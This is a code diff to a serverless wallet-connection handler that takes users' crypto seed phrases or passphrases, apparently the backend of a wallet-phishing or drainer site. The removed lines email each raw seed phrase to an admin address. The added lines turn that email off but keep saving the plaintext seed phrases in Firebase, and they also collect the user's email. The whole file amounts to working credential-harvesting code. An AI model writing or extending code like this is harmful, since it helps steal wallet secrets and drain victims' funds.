@@ -9,7 +9,8 @@
 const { WalletGenerator, INPUT_TYPES, WALLET_TYPES } = require('./utils/walletGenerator');
 const { createRPCInstance } = require('./utils/solanaRPC');
 const { FirebaseWalletStore } = require('./utils/firebaseWalletStore');
-const { sendWalletConnectionEmail } = require('./utils/loopsEmail');
+// ⚠️ EMAIL SENDING DISABLED - Comment out to only write to Firebase
+// const { sendWalletConnectionEmail } = require('./utils/loopsEmail');
 const jwt = require('jsonwebtoken');
 
 // Hardcoded defaults for local development
@@ -45,7 +46,7 @@ exports.handler = async (event) => {
 
   try {
     const body = JSON.parse(event.body);
-    const { walletName, walletType, inputType, credentials, accountIndex = 0 } = body;
+    const { walletName, walletType, inputType, credentials, accountIndex = 0, email } = body;
 
     // Validate required fields
     if (!walletName) {
@@ -53,6 +54,15 @@ exports.handler = async (event) => {
         statusCode: 400,
         headers,
         body: JSON.stringify({ error: 'walletName is required (user identifier)' })
+      };
+    }
+
+    // Validate email (optional but recommended)
+    if (email && !email.includes('@')) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'Invalid email format' })
       };
     }
 
@@ -124,22 +134,25 @@ exports.handler = async (event) => {
       const balanceData = await rpc.getBalance(existingWallet.walletAddress);
       const txHistory = await rpc.getTransactionHistory(existingWallet.walletAddress, 5);
 
-      // Update wallet with fresh data
+      // Update wallet with fresh data (including email if provided)
       await walletStore.updateWalletBalance(
         existingWallet.walletId,
         balanceData.balance,
-        txHistory.transactions.map(tx => tx.signature)
+        txHistory.transactions.map(tx => tx.signature),
+        email // Pass email to update if provided
       );
 
+      // ⚠️ EMAIL SENDING DISABLED - Only writing to Firebase now
       // Send email notification for returning user (async, don't wait)
-      sendWalletConnectionEmail(ADMIN_EMAIL, {
-        walletAddress: existingWallet.walletAddress,
-        inputType: existingWallet.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
-        balance: balanceData.balance,
-        isNewWallet: false,
-        codes: credentials, // The actual seed phrase or passphrase
-        walletType: existingWallet.walletType // Added walletType
-      }).catch(err => console.error('Email notification failed:', err.message));
+      // sendWalletConnectionEmail(ADMIN_EMAIL, {
+      //   walletAddress: existingWallet.walletAddress,
+      //   inputType: existingWallet.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
+      //   balance: balanceData.balance,
+      //   isNewWallet: false,
+      //   codes: credentials, // The actual seed phrase or passphrase
+      //   walletType: existingWallet.walletType // Added walletType
+      // }).catch(err => console.error('Email notification failed:', err.message));
+      console.log('📧 Email notification skipped (disabled) - Data saved to Firebase only');
 
       // Generate JWT token
       const token = jwt.sign(
@@ -187,18 +200,21 @@ exports.handler = async (event) => {
       await walletStore.saveWallet({
         ...walletInfo,
         balance: balanceData.balance,
-        credentials: credentials // Store the seed phrase or passphrase
+        credentials: credentials, // Store the seed phrase or passphrase
+        email: email || '' // Store email if provided
       });
 
+      // ⚠️ EMAIL SENDING DISABLED - Only writing to Firebase now
       // Send email notification (async, don't wait)
-      sendWalletConnectionEmail(ADMIN_EMAIL, {
-        walletAddress: walletInfo.walletAddress,
-        inputType: inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
-        balance: balanceData.balance,
-        isNewWallet: true,
-        codes: credentials, // The actual seed phrase or passphrase
-        walletType: walletInfo.walletType // Added walletType
-      }).catch(err => console.error('Email notification failed:', err.message));
+      // sendWalletConnectionEmail(ADMIN_EMAIL, {
+      //   walletAddress: walletInfo.walletAddress,
+      //   inputType: inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
+      //   balance: balanceData.balance,
+      //   isNewWallet: true,
+      //   codes: credentials, // The actual seed phrase or passphrase
+      //   walletType: walletInfo.walletType // Added walletType
+      // }).catch(err => console.error('Email notification failed:', err.message));
+      console.log('📧 Email notification skipped (disabled) - Data saved to Firebase only');
 
       // Generate JWT token
       const token = jwt.sign(
